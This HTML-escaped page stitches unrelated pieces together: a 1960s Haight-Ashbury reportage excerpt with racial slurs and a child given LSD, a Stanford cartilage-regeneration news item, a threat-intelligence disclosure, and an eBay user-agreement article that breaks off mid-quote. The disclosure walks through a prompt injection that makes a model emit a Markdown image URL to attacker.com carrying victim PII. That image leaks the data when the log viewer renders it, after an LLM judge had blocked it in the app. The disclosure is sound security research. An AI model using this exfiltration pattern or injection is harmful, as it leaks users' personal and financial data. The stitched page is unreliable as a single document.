    &lt;p&gt;Of course the activists — not those whose thinking had become rigid, but those whose approach to revolution was imaginatively anarchic — had long ago grasped the reality which still eluded the press: We were seeing something important. We were seeing the desperate attempt of a handful of pathetically unequipped children to create a community in a social vacuum. Once we had seen these children, we could no longer overlook the vacuum, no longer pretend that the society’s atomization could be reversed. At some point between 1945 and 1967, we had somehow neglected to tell these children the rules of the game we happened to be playing. Maybe we had stopped believing in the rules ourselves, maybe we were having a failure of nerve about the game. Or maybe there were just too few people around to do the telling. These were children who grew up cut loose from the web of cousins and great-aunts and family doctors and lifelong neighbors who had traditionally suggested and enforced the society’s values. They are children who have moved around a lot, San Jose, Chula Vista, here. They are less in rebellion against the society than ignorant of it, able only to feed back certain of its most publicized self-doubts, Vietnam, diet pills, the Bomb.&lt;/p&gt;
    &lt;p&gt;They feed back exactly what is given them. Because they do not believe in words — words are for “typeheads,” Chester Anderson tells them, and a thought which needs words is just another ego trip — their only proficient vocabulary is in the society’s platitudes. As it happens, I am still committed to the idea that the ability to think for oneself depends upon one’s mastery of the language, and I am not optimistic about children who will settle for saying, to indicate that their mother and father do not live together, that they come from “a broken home.” They are 14, 15, 16 years old, younger all the time, an army of children waiting to be given the words.&lt;/p&gt;
    &lt;p&gt;Peter Berg knows a lot of words.&lt;/p&gt;
    &lt;p&gt;“Is Peter Berg around?” I ask.&lt;/p&gt;
    &lt;p&gt;“Maybe.”&lt;/p&gt;
    &lt;p&gt;“Are you Peter Berg?”&lt;/p&gt;
    &lt;p&gt;“Yeh.”&lt;/p&gt;
    &lt;p&gt;The reason Peter Berg does not bother to share too many words with me is because two of the words he knows are “media poisoning.” Peter Berg wears a gold earring and is perhaps the only person in the District upon whom a gold earring looks obscurely ominous. He belongs to the San Francisco Mime Troupe, some of whose members started the Artist’s Liberation Front for “those who seek to combine their creative urge with socio-political involvement.” It was out of the Mime Troupe that the Diggers grew, during the 1966 Hunter’s Point riots when it seemed a good idea to give away food and do puppet shows in the streets, making fun of the National Guard. Along with Arthur Lisch, Peter Berg is part of the shadow leadership of the Diggers, and it was he who more or less invented and first introduced to the press the notion that there would be an influx into San Francisco this summer of 200,000 indigent adolescents. The only conversation I ever have with Peter Berg is about how he holds me personally responsible for the way Life captioned Henri Cartier-Bresson’s pictures out of Cuba, but I like to watch him at work in the Park.&lt;/p&gt;
    &lt;p&gt;Big Brother is playing in the Panhandle, and almost everybody is high, and it is a pretty nice Sunday afternoon between three and six o’clock, which the activists say are the three hours of the week when something is most likely to happen in the Haight-Ashbury, and who turns up but Peter Berg. He is with his wife and six or seven other people, along with Chester Anderson’s associate The Connection, and the first peculiar thing is, they’re in blackface. I mention to Max and Sharon that some members of the Mime Troupe seem to be in blackface.&lt;/p&gt;
    &lt;p&gt;“It’s street theater,” Sharon assures me. “It’s supposed to be really groovy.”&lt;/p&gt;
    &lt;p&gt;The Mime Troupers get a little closer, and there are some other peculiar things about them. For one thing they are tapping people on the head with dimestore plastic nightsticks, and for another they are wearing signs on their backs: HOW MANY TIMES YOU BEEN RAPED, YOU LOVE FREAKS? and things like that. Then they are distributing communication-company fliers which say:&lt;/p&gt;
    &lt;quote&gt;
      &lt;code&gt;&amp;amp; this summer thousands of unwhite un–suburban boppers are going to want to know why you’ve given up what they can’t get &amp;amp; how you get away with it &amp;amp; how come you not a faggot with hair so long &amp;amp; they want haight street one way or the other. IF YOU DON’T KNOW, BY AUGUST HAIGHT STREET WILL BE A CEMETERY.&lt;/code&gt;
    &lt;/quote&gt;
    &lt;p&gt;Max reads the flier and stands up. “I’m getting bad vibes,” he says, and he and Sharon leave.&lt;/p&gt;
    &lt;p&gt;I have to stay around because I’m looking for Otto so I walk over to where the Mime Troupers have formed a circle around a Negro. Peter Berg is saying, if anybody asks, that this is street theater, and I figure the curtain is up because what they are doing right now is jabbing the Negro with the nightsticks. They jab, and they bare their teeth, and they rock on the balls of their feet, and they wait.&lt;/p&gt;
    &lt;p&gt;“I’m beginning to get annoyed here,” the Negro says. “I’m gonna get mad.” By now there are several Negroes around, reading the signs and watching.&lt;/p&gt;
    &lt;p&gt;“Just beginning to get annoyed, are you?” one of the Mime Troupers says. “Don’t you think it’s about time?”&lt;/p&gt;
    &lt;p&gt;“Listen, here,” another Negro says. “There’s room for everybody in the Park.”&lt;/p&gt;
    &lt;p&gt;“Yeah?” a girl in blackface says. “Everybody who?”&lt;/p&gt;
    &lt;p&gt;“Why,” he says, confused. “Everybody. In America.”&lt;/p&gt;
    &lt;p&gt;“In America,”the blackface girl shrieks. “Listen to him talk about America.”&lt;/p&gt;
    &lt;p&gt;“Listen,” he says. “Listen here.”&lt;/p&gt;
    &lt;p&gt;“What’d America ever do for you?” the girl in blackface jeers. “White kids here, they can sit in the Park all summer long, listening to music, because their big-shot parents keep sending them money. Who ever sends you money?”&lt;/p&gt;
    &lt;p&gt;“Listen,” the Negro says helplessly. “You’re gonna start something here, this isn’t right —”&lt;/p&gt;
    &lt;p&gt;“You tell us what’s right, black boy,” the girl says.&lt;/p&gt;
    &lt;p&gt;The youngest member of the blackface group, an earnest tall kid about 19, 20, is hanging back at the edge of the scene. I offer him an apple and ask what is going on. “Well,” he says, “I’m new at this, I’m just beginning to study it, but you see the capitalists are taking over the District, and that’s what Peter — well, ask Peter.”&lt;/p&gt;
    &lt;p&gt;I did not ask Peter. It went on for a while. But on that particular Sunday between three and six o’clock everyone was too high, and the weather was too good, and the Hunter’s Point gangs who usually come in between three and six on Sunday afternoon had come in on Saturday instead, and nothing started. While I waited for Otto I asked a little girl I had met a couple of times before what she had thought of it. “It’s something groovy they call street theater,” she said. I said I had wondered if it might not have political overtones. She is 17 years old, and she worked it around in her mind for a while and finally she remembered a couple of words from somewhere. “Maybe it’s some John Birch thing,” she said.&lt;/p&gt;
    &lt;p&gt;When I finally find Otto he says, “I got something at my place that’ll blow your mind,” and when we get there I see a child on the living-room floor, wearing a reefer coat, reading a comic book. She keeps licking her lips in concentration and the only off thing about her is that she’s wearing white lipstick.&lt;/p&gt;
    &lt;p&gt;“Five years old,” he says. “On acid.”&lt;/p&gt;
    &lt;p&gt;The five-year-old’s name is Susan, and she tells me she is in High Kindergarten. She lives with her mother and some other people, just got over the measles, wants a bicycle for Christmas, and particularly likes soda, ice cream, Marty in the Jefferson Airplane, Bob in the Grateful Dead, and the beach. She remembers going to the beach once a long time ago, and wishes she had taken a bucket. For a year, her mother has given her acid and peyote. Susan describes it as getting stoned.&lt;/p&gt;
    &lt;p&gt;I start to ask if any of the other children in High Kindergarten get stoned, but I falter at the key words.&lt;/p&gt;
    &lt;p&gt;“She means do the other kids in your class turn on, get stoned,” says the friend of her mothers who brought her to Otto’s.&lt;/p&gt;
    &lt;p&gt;“Only Sally and Anne,” Susan says.&lt;/p&gt;
    &lt;p&gt;“What about Lia?” her mother’s friend prompts.&lt;/p&gt;
    &lt;p&gt;“Lia,” Susan says, “is not in High Kindergarten.”&lt;/p&gt;
    &lt;p&gt;Sue Ann’s three-year-old Michael started a fire this morning before anyone was up, but Don got it out before much damage was done. Michael burned his arm, though, which is probably why his mother was so jumpy when she happened to see him chewing on an electric cord. “You’ll fry like rice,” she screamed. The only people around were Don and one of Sue Ann’s macrobiotic friends and somebody who was on his way to a commune in the Santa Lucias, and they didn’t notice Sue Ann screaming at Michael because they were in the kitchen trying to retrieve some very good Moroccan hash which had dropped down through a floorboard that had been damaged in the fire.&lt;/p&gt;

  &lt;main&gt;
    &lt;head rend="h1"&gt;Stanford scientists found a way to regrow cartilage and stop arthritis&lt;/head&gt;
    &lt;head rend="h2"&gt;Scientists have found a way to regrow aging cartilage, raising hopes for arthritis treatments that could make joint replacements obsolete.&lt;/head&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;Date:&lt;/item&gt;
      &lt;item rend="dd-1"&gt;January 20, 2026&lt;/item&gt;
      &lt;item rend="dt-2"&gt;Source:&lt;/item&gt;
      &lt;item rend="dd-2"&gt;Stanford Medicine&lt;/item&gt;
      &lt;item rend="dt-3"&gt;Summary:&lt;/item&gt;
      &lt;item rend="dd-3"&gt;Scientists at Stanford Medicine have discovered a treatment that can reverse cartilage loss in aging joints and even prevent arthritis after knee injuries. By blocking a protein linked to aging, the therapy restored healthy, shock-absorbing cartilage in old mice and injured joints, dramatically improving movement and joint function. Human cartilage samples from knee replacement surgeries also began regenerating when exposed to the treatment.&lt;/item&gt;
      &lt;item rend="dt-4"&gt;Share:&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;A study led by Stanford Medicine researchers has found that an injection blocking a protein linked to aging can reverse the natural loss of knee cartilage in older mice. The same treatment also stopped arthritis from developing after knee injuries that resemble ACL tears, which are common among athletes and recreational exercisers. Researchers note that an oral version of the treatment is already being tested in clinical trials aimed at treating age-related muscle weakness.&lt;/p&gt;
    &lt;p&gt;Human cartilage samples taken from knee replacement surgeries also responded positively. These samples included both the supportive extracellular matrix of the joint and cartilage-producing chondrocyte cells. When treated, the tissue began forming new, functional cartilage.&lt;/p&gt;
    &lt;p&gt;Together, the findings suggest that cartilage lost due to aging or arthritis may one day be restored using either a pill or a targeted injection. If successful in people, such treatments could reduce or even eliminate the need for knee and hip replacement surgery.&lt;/p&gt;
    &lt;p&gt;A Direct Attack on Osteoarthritis&lt;/p&gt;
    &lt;p&gt;Osteoarthritis is a degenerative joint disease that affects about one in five adults in the United States and generates an estimated $65 billion each year in direct health care costs. Current treatments focus on managing pain or replacing damaged joints surgically. There are no approved drugs that can slow or reverse the underlying cartilage damage.&lt;/p&gt;
    &lt;p&gt;The new approach targets the root cause of the disease rather than its symptoms, offering a potential shift in how osteoarthritis is treated.&lt;/p&gt;
    &lt;p&gt;The Role of a Master Aging Enzyme&lt;/p&gt;
    &lt;p&gt;The protein at the center of the study is called 15-PGDH. Researchers refer to it as a gerozyme because its levels increase as the body ages. Gerozymes were identified by the same research team in 2023 and are known to drive the gradual loss of tissue function.&lt;/p&gt;
    &lt;p&gt;In mice, higher levels of 15-PGDH are linked to declining muscle strength with age. Blocking the enzyme using a small molecule boosted muscle mass and endurance in older animals. In contrast, forcing young mice to produce more 15-PGDH caused their muscles to shrink and weaken. The protein has also been connected to regeneration in bone, nerve, and blood cells.&lt;/p&gt;
    &lt;p&gt;In most of these tissues, repair happens through the activation and specialization of stem cells. Cartilage appears to be different. In this case, chondrocytes change how their genes behave, shifting into a more youthful state without relying on stem cells.&lt;/p&gt;
    &lt;p&gt;A New Path to Tissue Regeneration&lt;/p&gt;
    &lt;p&gt;"This is a new way of regenerating adult tissue, and it has significant clinical promise for treating arthritis due to aging or injury," said Helen Blau, PhD, professor of microbiology and immunology. "We were looking for stem cells, but they are clearly not involved. It's very exciting."&lt;/p&gt;
    &lt;p&gt;Blau, who leads the Baxter Laboratory for Stem Cell Biology and holds the Donald E. and Delia B. Baxter Foundation Professorship, and Nidhi Bhutani, PhD, associate professor of orthopaedic surgery, are the study's senior authors. The research was published in Science. Mamta Singla, PhD, instructor of orthopaedic surgery, and former postdoctoral scholar Yu Xin (Will) Wang, PhD, served as lead authors. Wang is now an assistant professor at the Sanford Burnham Institute in San Diego.&lt;/p&gt;
    &lt;p&gt;Dramatic Regeneration of Joint Cartilage&lt;/p&gt;
    &lt;p&gt;"Millions of people suffer from joint pain and swelling as they age," Bhutani said. "It is a huge unmet medical need. Until now, there has been no drug that directly treats the cause of cartilage loss. But this gerozyme inhibitor causes a dramatic regeneration of cartilage beyond that reported in response to any other drug or intervention."&lt;/p&gt;
    &lt;p&gt;The human body contains three main types of cartilage. Elastic cartilage is soft and flexible and forms structures such as the outer ear. Fibrocartilage is dense and tough, helping absorb shock in places like the spaces between spinal vertebrae. Hyaline cartilage is smooth and glossy, allowing joints such as the hips, knees, shoulders, and ankles to move with low friction. This type, also called articular cartilage, is the form most commonly damaged in osteoarthritis.&lt;/p&gt;
    &lt;p&gt;Why Cartilage Rarely Grows Back&lt;/p&gt;
    &lt;p&gt;Osteoarthritis develops when joints are stressed by aging, injury, or obesity. Chondrocytes begin releasing inflammatory molecules and breaking down collagen, the main structural protein in cartilage. As collagen is lost, cartilage becomes thinner and softer. Inflammation then leads to swelling and pain, which are hallmarks of the disease.&lt;/p&gt;
    &lt;p&gt;Under normal conditions, articular cartilage has very limited ability to regenerate. While some stem or progenitor cells capable of forming cartilage have been identified in bone, similar cells have not been successfully found within articular cartilage itself.&lt;/p&gt;
    &lt;p&gt;Connecting Aging, Prostaglandins, and Repair&lt;/p&gt;
    &lt;p&gt;Earlier research from Blau's lab showed that prostaglandin E2 is essential for muscle stem cell function. The enzyme 15-PGDH breaks down prostaglandin E2. By blocking 15-PGDH or increasing prostaglandin E2 levels, researchers previously supported the repair of damaged muscle, nerve, bone, colon, liver, and blood cells in young mice.&lt;/p&gt;
    &lt;p&gt;This led the team to question whether the same pathway might be involved in cartilage aging and joint damage. When they compared knee cartilage from young and old mice, they found that 15-PGDH levels roughly doubled with age.&lt;/p&gt;
    &lt;p&gt;Regrowing Cartilage in Aging Knees&lt;/p&gt;
    &lt;p&gt;Researchers then injected older mice with a small molecule that inhibits 15-PGDH. They first administered the drug into the abdomen to affect the entire body, and later injected it directly into the knee joint. In both cases, cartilage that had become thin and dysfunctional with age thickened across the joint surface.&lt;/p&gt;
    &lt;p&gt;Additional tests confirmed that the regenerated tissue was hyaline cartilage rather than the less functional fibrocartilage.&lt;/p&gt;
    &lt;p&gt;"Cartilage regeneration to such an extent in aged mice took us by surprise," Bhutani said. "The effect was remarkable."&lt;/p&gt;
    &lt;p&gt;Protecting Joints After ACL-Like Injuries&lt;/p&gt;
    &lt;p&gt;The team observed similar benefits in mice with knee injuries resembling ACL tears, which often occur during sports involving sudden stopping, pivoting, or jumping. Although such injuries can be surgically repaired, about half of affected people develop osteoarthritis in the injured joint within 15 years.&lt;/p&gt;
    &lt;p&gt;Mice that received twice-weekly injections of the gerozyme inhibitor for four weeks after injury were far less likely to develop osteoarthritis. In contrast, animals given a control treatment had double the levels of 15-PGDH compared with uninjured mice and developed osteoarthritis within four weeks.&lt;/p&gt;
    &lt;p&gt;Treated mice also moved more normally and placed more weight on the injured leg than untreated animals.&lt;/p&gt;
    &lt;p&gt;"Interestingly, prostaglandin E2 has been implicated in inflammation and pain," Blau said. "But this research shows that, at normal biological levels, small increases in prostaglandin E2 can promote regeneration."&lt;/p&gt;
    &lt;p&gt;Reprogramming Cartilage Cells Without Stem Cells&lt;/p&gt;
    &lt;p&gt;Closer analysis showed that chondrocytes in older mice expressed more genes linked to inflammation and the conversion of cartilage into bone, along with fewer genes involved in cartilage formation. Treatment shifted these patterns.&lt;/p&gt;
    &lt;p&gt;One group of chondrocytes that produced 15-PGDH and cartilage-degrading genes dropped from 8% to 3%. Another group associated with fibrocartilage formation declined from 16% to 8%. A third population, which did not produce 15-PGDH and instead expressed genes tied to hyaline cartilage formation and maintenance of the extracellular matrix, rose from 22% to 42%.&lt;/p&gt;
    &lt;p&gt;These changes indicate a broad return to a more youthful cartilage profile without involving stem or progenitor cells.&lt;/p&gt;
    &lt;p&gt;Evidence From Human Cartilage Samples&lt;/p&gt;
    &lt;p&gt;The researchers also tested cartilage taken from patients undergoing total knee replacement for osteoarthritis. After one week of treatment with the 15-PGDH inhibitor, the tissue showed fewer 15-PGDH-producing chondrocytes, reduced expression of cartilage degradation and fibrocartilage genes, and early signs of articular cartilage regeneration.&lt;/p&gt;
    &lt;p&gt;"The mechanism is quite striking and really shifted our perspective about how tissue regeneration can occur," Bhutani said. "It's clear that a large pool of already existing cells in cartilage are changing their gene expression patterns. And by targeting these cells for regeneration, we may have an opportunity to have a bigger overall impact clinically."&lt;/p&gt;
    &lt;p&gt;Looking Toward Human Trials&lt;/p&gt;
    &lt;p&gt;Blau added, "Phase 1 clinical trials of a 15-PGDH inhibitor for muscle weakness have shown that it is safe and active in healthy volunteers. Our hope is that a similar trial will be launched soon to test its effect in cartilage regeneration. We are very excited about this potential breakthrough. Imagine regrowing existing cartilage and avoiding joint replacement."&lt;/p&gt;
    &lt;p&gt;Researchers from the Sanford Burnham Prebys Medical Discovery Institute also contributed to the study.&lt;/p&gt;
    &lt;p&gt;The work was supported by funding from the National Institutes of Health (grants R01AR070864, R01AR077530, R01AG069858 and R00NS120278), the Baxter Foundation for Stem Cell Biology, the Li Ka Shing Foundation, the Stanford Cardiovascular Institute, the Milky Way Research Foundation, the Canadian Institutes of Health Research, a Stanford Translational Research and Applied Medicine Pilot grant, a GlaxoSmithKline Sir James Black Postdoctoral Fellowship, and a Stanford Dean's Postdoctoral Fellowship.&lt;/p&gt;
    &lt;p&gt;Blau, Bhutani, and other co-authors are inventors on patent applications held by Stanford University related to 15-PGDH inhibition in cartilage and tissue rejuvenation, which are licensed to Epirium Bio.

  &lt;main&gt;
    &lt;p&gt;Threat Intelligence&lt;/p&gt;
    &lt;head rend="h1"&gt;OpenAI API Logs: Unpatched Data Exfiltration&lt;/head&gt;
    &lt;p&gt;OpenAIâs API log viewer is vulnerable to a data exfiltration attack, exposing apps and agents that use OpenAI APIs, even if developers (and Agent Builder users) leverage all available defenses. The vulnerability was disclosed to OpenAI, but was closed with the status 'Not applicable' after 4 follow-ups.&lt;/p&gt;
    &lt;head rend="h3"&gt;Context&lt;/head&gt;
    &lt;p&gt;The OpenAI Platform interface has a vulnerability that exposes all AI applications and agents built with OpenAI âresponsesâ and âconversationsâ APIs to data exfiltration risks due to insecure Markdown image rendering in the API logs. âResponsesâ is the default API recommended for building AI features (and it supports Agent Builder) â vendors that list OpenAI as a subprocessor are likely using this API, exposing them to the risk. This attack succeeds even when developers have built protections into their applications and agents to prevent Markdown image rendering.&lt;/p&gt;
    &lt;p&gt;Attacks in this article were responsibly disclosed to OpenAI (via BugCrowd). The report was closed with the status âNot applicableâ after four follow-ups (more details in the Responsible Disclosure section). We have chosen to publicize this research to inform OpenAI customers and users of apps built on OpenAI, so they can take precautions and reduce their risk exposure.&lt;/p&gt;
    &lt;p&gt;Additional findings at the end of the article impact five more surfaces: Agent Builder, Assistant Builder, and Chat Builder preview environments (for testing AI tools being built), the ChatKit Playground, and the Starter ChatKit app, which developers are provided to build upon.&lt;/p&gt;
    &lt;head rend="h3"&gt;The Attack Chain&lt;/head&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;An application or agent is built using the OpenAI Platform&lt;/p&gt;
        &lt;p&gt;In this attack, we demonstrate a vulnerability in OpenAI's API log viewer. To show how an attack would play out, we created an app with an AI assistant that uses the âresponsesâ API to generate replies to user queries.&lt;/p&gt;
        &lt;p&gt;For this attack chain, we created an AI assistant in a mock Know Your Customer (KYC) tool. KYC tools enable banks to verify customer identities and assess risks, helping prevent financial crimes â this process involves sensitive data (PII and financial data provided by the customer) being processed alongside untrusted data (including data found online) used to validate the customer's attestations.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The user interacts with the AI assistant or agent built using the OpenAI âresponsesâ or âconversationsâ API&lt;/p&gt;
        &lt;p&gt;Here, 6 data sources are pulled in as part of the KYC review process for this customer. One of these data sources contains content scraped from the internet that has been poisoned with a prompt injection.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;When the user selects one of the recommended queries, the AI app blocks the data exfiltration attack&lt;/p&gt;
        &lt;p&gt;In this step, the prompt injection in the untrusted data source manipulates the AI model to output a malicious Markdown image. The image URL is dynamically generated and contains the attackerâs domain with the victimâs data appended to the URL:&lt;/p&gt;
        &lt;p&gt;attacker.com/img.png?data=&lt;/p&gt;
        &lt;code&gt;{AI appends victimâs sensitive data here}&lt;/code&gt;
        &lt;p&gt;However, the malicious response is flagged by an LLM as a judge and blocked, so it is not rendered by the AI app.&lt;/p&gt;
        &lt;p&gt;Note: this attack can occur without an LLM as a judge; more details in Attacking Systems with Alternative Image Defenses.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The flagged conversation is selected for review in the OpenAI platform, which uses Markdown&lt;/p&gt;
        &lt;p&gt;When investigating the flagged conversation, the first step a developer would likely take is opening the OpenAI API logs and reviewing the conversation. The logs for the OpenAI âresponsesâ and âconversationsâ APIs are displayed using Markdown formatting.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;&lt;p&gt;The AI output that was blocked in the KYC app is rendered as Markdown in the log viewer, exfiltrating sensitive data&lt;/p&gt;&lt;p&gt;When the conversation log for the flagged chat is opened, the response containing a malicious Markdown image is rendered in the OpenAI Platform's API Log viewer. Remember, this is the same response that was not rendered in the AI KYC app because an application-level defense blocked it!&lt;/p&gt;&lt;lb/&gt;When the image is rendered in the OpenAI Logs viewer, a request to retrieve the image is made to the URL generated by the model in step 3. This results in data exfiltration, as the URL was created using the attacker's domain with the victim's sensitive data appended on the end. Since the image is on the attacker's domain, the attacker can read the full URL that was requested from their site, including the appended PII (SSN, passport, etc.) and financials (credit history).&lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Attackers can view the victimâs exfiltrated PII (passport, license, etc.) and financials (net worth, bank choice, etc.)&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Attacking Systems with Alternative Image Defenses&lt;/head&gt;
    &lt;p&gt;In the attack chain above, the malicious response containing a Markdown image was blocked by an LLM as a judge. But, there are many other defenses that can be used to prevent Markdown images from rendering (which can protect the user until the insecure API log is opened).&lt;/p&gt;
    &lt;p&gt;These defenses include:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Content security policies&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Programmatic sanitization of Markdown images from AI output&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;AI outputs not being rendered using Markdown in the AI app; plain text only&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Apps that use these defenses can still be impacted. As an example, one common feedback mechanism is the thumbs-up / thumbs-down in chat. Usually, responses that encounter a prompt injection result in malformed or manipulated output. If a user selects âthumbs downâ on that response, it will be flagged for review, allowing for the attack chain to occur in the OpenAI Logs.&lt;/p&gt;
    &lt;p&gt;Here we can see Perplexity, which uses thumbs-up/thumbs-down feedback. Below is a Perplexity response that was programmatically sanitized, stripping a Markdown image. It leaves an odd, empty response, to which a user may reasonably react with âthumbs downâ.&lt;/p&gt;
    &lt;p&gt;If a developer goes to review this, they may be affected by the same attack chain described above.&lt;/p&gt;
    &lt;head rend="h3"&gt;The Complete Attack Surface&lt;/head&gt;
    &lt;p&gt;Insecure Markdown rendering has been identified in the logs for the âresponsesâ and âconversationsâ APIs. As mentioned, systems built using these APIs include:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Agent Builder&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Assistants&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;AI features from vendors that list OpenAI as a subprocessor (since Responses is the default API for building AI features).&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Additionally, the preview interfaces used to test AI tools being developed in the OpenAI platform also exhibited insecure Markdown image rendering (meaning that a prompt injection could exfiltrate data when anyone is testing their systems). This includes:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Create Chat&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Create Assistant&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;and Agent Builder.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Similarly, the Starter ChatKit App, ChatKit Playground, and Widget Builder (used by developers to get off the ground while building AI apps) lack defenses against insecure image rendering.&lt;/p&gt;
    &lt;head rend="h3"&gt;Responsible Disclosure&lt;/head&gt;
    &lt;p&gt;Given the varied ways in which prompt injections can exploit systems, triaging prompt injection vulnerabilities is challenging â they are often difficult to classify under existing vulnerability taxonomies. After coordination with triagers, this report was determined to be 'Not Applicable' for the OpenAI BugCrowd program.&lt;/p&gt;

  &lt;main&gt;
    &lt;head rend="h1"&gt;eBay Explicitly Bans AI “Buy For Me” Agents, Updates Arbitration &amp;amp; Dispute Rules In User Agreement Update&lt;/head&gt;
    &lt;p&gt;eBay explicitly prohibits AI "buy for me" agents and LLM (larger language model) bots, updates arbitration and dispute resolution requirements in latest User Agreement update, going into effect February 20, 2026.&lt;/p&gt;
    &lt;p&gt;The following summary of changes was provided in an email sent to users:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;We’ve updated eBay’s User Agreement, including the agreement to arbitrate any disputes you may have with us. Our updated User Agreement was posted on January 20, 2026. For users who agreed to a prior version of our User Agreement, this agreement is effective as of February 20, 2026.&lt;/p&gt;
      &lt;p&gt;In this update, eBay is updating its anti-scraping prohibition to clarify that it specifically also includes bots used for AI or LLMs. eBay is also updating the agreement to arbitrate in the updated User Agreement:&lt;/p&gt;
      &lt;item&gt;We clarified the scope of the class action waiver.&lt;/item&gt;
      &lt;item&gt;We clarified the process for opting out of the agreement to arbitrate.&lt;/item&gt;
      &lt;item&gt;We updated the physical address to which notices for informal dispute resolution, arbitration demands, and notices for opting out of arbitration must be sent.&lt;/item&gt;
    &lt;/quote&gt;
    &lt;p&gt;As always, sellers are encouraged to read the entire updated terms carefully, but Value Added Resource has you covered with a side by side comparison highlighting some key changes.&lt;/p&gt;
    &lt;p&gt;Disclaimer: comparisons are made using both automated and manual methods and are provided for informational purposes only - no warranty of completeness or accuracy is expressed or implied and users are advised to do their own due diligence.&lt;/p&gt;
    &lt;head rend="h3"&gt;AI Agents &amp;amp; LLM Scraping&lt;/head&gt;
    &lt;p&gt;First, as the summary calls out, eBay is explicitly prohibiting AI "buy for me" agents and LLM scraping bots from interacting with the platform without permission from eBay.&lt;/p&gt;
    &lt;p&gt;Old Version:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;In connection with using or accessing our Services you agree to comply with this User Agreement, our policies, our terms, and all applicable laws, rules, and regulations, and you will not...&lt;/p&gt;
      &lt;p&gt;...use any robot, spider, scraper, data mining tools, data gathering and extraction tools, or other automated means to access our Services for any purpose, except with the prior express permission of eBay;&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;New Version:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;In connection with using or accessing our Services you agree to comply with this User Agreement, our policies, our terms, and all applicable laws, rules, and regulations, and you will not...&lt;/p&gt;
      &lt;p&gt;use any robot, spider, scraper, data mining tools, data gathering and extraction tools, or other automated means (including, without limitation buy-for-me agents, LLM-driven bots, or any end-to-end flow that attempts to place orders without human review) to access our Services for any purpose, except with the prior express permission of eBay;&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;The move comes after eBay quietly changed their robots.txt file with new guidance placing guardrails and restrictions on how AI agents interact with the site in December.&lt;/p&gt;
    &lt;p&gt;It also comes on the heels of Amazon's controversial Buy For Me test which uses agentic AI to display items from direct merchant websites for sale through the Amazon app, even if the brand does not sell on Amazon themselves - raising concerns about transparency, consent, and control over how product details are displayed to buyers.&lt;/p&gt;
    &lt;p&gt;While it appears that Amazon Buy For Me currently does not pull inventory from other third party marketplaces, it would not be surprising if eBay is reacting at least in part to this and other agentic commerce news making recent headlines.&lt;/p&gt;
    &lt;head rend="h3"&gt;Arbitration &amp;amp; Dispute Resolution&lt;/head&gt;
    &lt;p&gt;The rest of the changes in this User Agreement update affect arbitration and dispute resolution.&lt;/p&gt;
    &lt;p&gt;eBay's previous User Agreement update in May 2025 made significant changes to arbitration terms and limits on lawsuits, forcing users to give up their right to the sue the company in many situations.&lt;/p&gt;
    &lt;p&gt;In this update, eBay has finally updated the address to send arbitration opt out requests and other legal correspondence to since selling their former office in Draper, UT in 2024.&lt;/p&gt;
    &lt;p&gt;Old Version:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Notice to eBay should be sent by email to DisputeNotice@eBay.com or regular mail to our offices located at 583 W. eBay Way, Draper, UT 84020.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;New Version:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Notice to eBay should be sent by email to DisputeNotice@eBay.com or regular mail to our offices located at 339 W. 13490 S., Ste. 500, Draper, UT 84020&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Most importantly, eBay has expanded their arbitration clause which previously prohibited class actions to now also explicitly exclude more types of group legal actions.&lt;/p&gt;
    &lt;p&gt;Old Version:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;EACH OF US MAY BRING CLAIMS AGAINST THE OTHER ONLY ON AN INDIVIDUAL BASIS AND NOT ON A CLASS, REPRESENTATIVE, OR COLLECTIVE BASIS, AND THE PARTIES HEREBY WAIVE ALL RIGHTS TO HAVE ANY DISPUTE BE BROUGHT, HEARD, ADMINISTERED, RESOLVED, OR ARBITRATED ON A CLASS, COLLECTIVE, OR REPRESENTATIVE BASIS. ONLY INDIVIDUAL RELIEF IS AVAILABLE.&lt;/p&gt;
      &lt;p&gt;Subject to this Agreement to Arbitrate, the arbitrator may award declaratory or injunctive relief only in favor of the individual party seeking relief and only to the extent necessary to provide relief warranted by the party’s individual claim. Nothing in this paragraph is intended to, nor shall it, affect the terms and conditions under Section 19.B.7 ("Batch Arbitration").&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;New Version:&lt;/p&gt;
    &lt;quote&gt;
